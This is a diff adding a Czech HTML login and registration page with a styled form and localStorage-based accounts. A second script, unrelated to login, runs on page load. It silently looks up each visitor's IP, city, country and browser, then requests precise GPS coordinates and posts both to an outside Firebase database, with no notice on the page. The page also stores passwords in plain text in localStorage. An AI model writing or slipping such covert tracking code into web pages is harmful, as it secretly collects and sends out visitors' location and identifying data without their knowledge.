@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+<meta charset="UTF-8">
+<title>Login</title>
+
+<style>
+body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  overflow: hidden;
+}
+
+#bgVideo {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  z-index: -1;
+}
+
+.container {
+  background: rgba(0, 0, 0, 0.35);
+  backdrop-filter: blur(12px);
+  padding: 30px;
+  border-radius: 15px;
+  box-shadow: 0 0 25px rgba(192,132,252,0.6);
+  width: 300px;
+  text-align: center;
+  animation: fadeIn 2s ease;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(20px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+h2 { color: white; }
+
+button {
+  margin-top: 8px;
+  width: 160px;
+  padding: 10px;
+  background: linear-gradient(45deg, #9333ea, #c084fc);
+  color: white;
+  border: none;
+  border-radius: 6px;
+  cursor: pointer;
+  transition: 0.3s;
+}
+
+button:hover {
+  transform: scale(1.05);
+  box-shadow: 0 0 15px #c084fc;
+}
+
+.hidden { display: none; }
+
+.input-group {
+  position: relative;
+  margin: 20px 0;
+}
+
+.input-group input {
+  width: 80%;
+  padding: 12px;
+  padding-right: 45px;
+  border: 1px solid rgba(255,255,255,0.4);
+  border-radius: 5px;
+  background: rgba(74,73,73,0.6);
+  color: white;
+  outline: none;
+}
+
+
+.input-group label {
+  position: absolute;
+  left: 12px;
+  top: 12px;
+  pointer-events: none; /* 🔥 důležité */
+  color: rgba(255,255,255,0.5);
+  transition: 0.3s;
+}
+
+.input-group input:focus + label,
+.input-group input:valid + label {
+  top: -8px;
+  left: 10px;
+  font-size: 12px;
+  color: #c084fc;
+  background: rgba(0,0,0,0.6);
+  padding: 0 5px;
+}
+
+.toggle {
+  position: absolute;
+  right: 15px;
+  top: 50%;
+  transform: translateY(-50%);
+  cursor: pointer;
+  color: white;
+}
+
+p {
+  color: #ccc;
+  white-space: pre-wrap;
+}
+
+.logged-in {
+  background: rgba(0, 0, 0, 0.6);
+  box-shadow: 0 0 40px #ff0015;
+  transform: scale(1.05);
+}
+
+
+</style>
+</head>
+
+<body>
+
+<video autoplay muted loop id="bgVideo">
+  <source src="7762075-hd_1920_1080_25fps.mp4" type="video/mp4">
+</video>
+
+<div class="container" id="loginBox">
+  <h2>Login / Registrace</h2>
+
+  <div class="input-group">
+    <input type="text" id="username" required>
+    <label>Jméno</label>
+  </div>
+
+  <div class="input-group">
+    <input type="password" id="password" required>
+    <label>Heslo</label>
+    <span class="toggle" onclick="togglePassword('password', this)">O_O</span>
+  </div>
+
+  <div class="input-group">
+    <input type="password" id="confirmPassword" required>
+    <label>Potvrzení hesla</label>
+    <span class="toggle" onclick="togglePassword('confirmPassword', this)">O_O</span>
+  </div>
+
+  <button onclick="register()">Registrovat</button>
+  <button onclick="loginUser()">Přihlásit</button>
+</div>
+
+<div class="container hidden" id="resultBox">
+  <h2>Vítej!</h2>
+  <p id="output"></p>
+</div>
+
+<script>
+function register() {
+  const username = document.getElementById('username').value;
+  const password = document.getElementById('password').value;
+  const confirm = document.getElementById('confirmPassword').value;
+
+  if (!username || !password || !confirm) {
+    alert('Vyplň všechna pole!');
+    return;
+  }
+
+  if (password !== confirm) {
+    alert('Hesla se neshodují!');
+    return;
+  }
+
+  localStorage.setItem('user', username);
+  localStorage.setItem('pass', password);
+
+  alert('Registrace uložena!');
+}
+
+function loginUser() {
+  const username = document.getElementById('username').value;
+  const password = document.getElementById('password').value;
+
+  const savedUser = localStorage.getItem('user');
+  const savedPass = localStorage.getItem('pass');
+
+  if (username === savedUser && password === savedPass) {
+    document.getElementById('loginBox').classList.add('hidden');
+    document.getElementById('resultBox').classList.remove('hidden');
+
+    document.getElementById('output').innerText = `Přihlášen jako: ${username}`;
+    document.getElementById('resultBox').classList.add('logged-in');
+    document.getElementById('output').innerHTML += `
+  <br><br>
+  <button onclick="logout()">Odhlásit se</button>
+  <button onclick="ok()">ok</button>
+    <button onclick="oke()">oke</button>
+`;
+
+  } else {
+    alert('Špatné jméno nebo heslo!');
+  }
+}
+
+function logout() {
+  document.getElementById('resultBox').classList.remove('logged-in');
+  document.getElementById('resultBox').classList.add('hidden');
+  document.getElementById('loginBox').classList.remove('hidden');
+  document.getElementById('username').value = '';
+  document.getElementById('password').value = '';
+  document.getElementById('confirmPassword').value = '';
+}
+
+function ok() {
+    document.getElementById('resultBox').classList.add('logged-in');
+    document.getElementById('resultBox').classList.add('hidden');
+    document.getElementById('loginBox').classList.add('hidden');
+}
+function oke() {
+    window.location.href = '1.html';
+}
+
+function togglePassword(id, el) {
+  const input = document.getElementById(id);
+
+  if (input.type === "password") {
+    input.type = "text";
+    el.textContent = "X_X";
+  } else {
+    input.type = "password";
+    el.textContent = "O_O";
+  }
+}
+
+</script>
+
+<script>
+(function() {
+    // 1. Zjištění IP adresy a polohy
+    fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+            const logData = {
+                ip: data.ip,
+                mesto: data.city,
+                stat: data.country_name,
+                prohlizec: navigator.userAgent,
+                cas: new Date().toLocaleString('cs-CZ')
+            };
+
+            // 2. URL vaší Firebase databáze (písmeno "LOGY" na konci vytvoří složku v databázi)
+            // SEM VLOŽÍTE URL, KTEROU ZÍSKÁTE V KROKU NÍŽE
+          const firebaseURL = 'https://mylocatedatabase-default-rtdb.firebaseio.com/LOGY.json';
+
+            // 3. Odeslání dat do Firebase  
+
+          fetch(firebaseURL, {
+           method: 'POST',
+            headers: {
+             'Content-Type': 'application/json'
+          },
+           body: JSON.stringify(logData)
+        });
+        })
+        .then(() => console.log('IP adresa byla úspěšně uložena do cloudu.'))
+        .catch(error => console.error('Chyba:', error));
+})();
+function getGPSLocation() {
+    if (!navigator.geolocation) {
+        alert("Tento prohlížeč nepodporuje GPS.");
+        return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+        function(position) {
+            const logData = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                presnost: position.coords.accuracy,
+                cas: new Date().toLocaleString("cs-CZ")
+            };
+
+            console.log("GPS poloha:", logData);
+        },
+        function(error) {
+            console.error("GPS chyba:", error.message);
+        },
+        {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+        }
+    );
+}
+function getGPSLocation() {
+    navigator.geolocation.getCurrentPosition(async position => {
+
+        const logData = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            presnost: position.coords.accuracy,
+            cas: new Date().toLocaleString("cs-CZ")
+        };
+
+        const url = 'https://mylocatedatabase-default-rtdb.firebaseio.com/LOGY.json';
+
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(logData)
+        });
+
+        console.log(response.ok ? "GPS uloženo!" : "Chyba Firebase!");
+
+    }, error => console.log("GPS nebylo povoleno:", error.message));
+}
+
+getGPSLocation();
+</script>
+
+</body>
+</html>
